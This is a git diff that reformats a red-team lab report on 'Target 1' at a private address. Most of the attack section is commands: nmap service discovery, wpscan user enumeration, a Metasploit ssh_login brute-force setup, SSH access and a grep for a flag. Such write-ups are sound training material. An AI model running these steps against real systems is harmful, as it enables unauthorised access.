@@ -2,22 +2,24 @@
 
 ## Table of Contents
 - Exposed Services
-- Critical Vulnerabilities
 - Exploitation
 
 ### Exposed Services
 Nmap scan results for each machine reveal the below services and OS details:
 
-```bash
+```
 $ nmap -sV 192.168.1.0/24
-
+![NMAP scan](images/nmap_scan.png)
 ```
 
 This scan identifies the services below as potential points of entry:
 - Target 1
-  - OpenSSH 6.7p1 | Ports: 22
-  - Apache httpd 2.4.10 | Ports: 80
-  - Samba smbd 3.X - 4.X | Ports: 139, 445
+
+  |        Service       |   Port  |
+  |:--------------------:|:-------:|
+  |     OpenSSH 6.7p1    |    22   |
+  |  Apache httpd 2.4.10 |    80   |
+  | Samba smbd 3.X - 4.X | 139,445 |
 
 The following vulnerabilities were identified on each target:
 - Target 1
@@ -34,9 +36,12 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
     - **Exploit Used**
       - WPscan to enumerate users on Target 1
    - Commands:
-```wpscan --url http://192.168.1.110/wordpress -e u```
+```
+wpscan --url http://192.168.1.110/wordpress -e u
 
-```$ msfconsole```
+```
+
+`$ msfconsole`
 ` > search ssh_login`
 ` > use 0`
 ` > set rhost 192.168.1.110`
@@ -45,7 +50,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 ` > set stop_on_success true`
 ` > run`
 
-‘> exit -y`
+`> exit -y`
 `$ ssh michael@192.168.1.110`
 
 `$ grep -rnw / -e “flag1” 2> /dev/null`
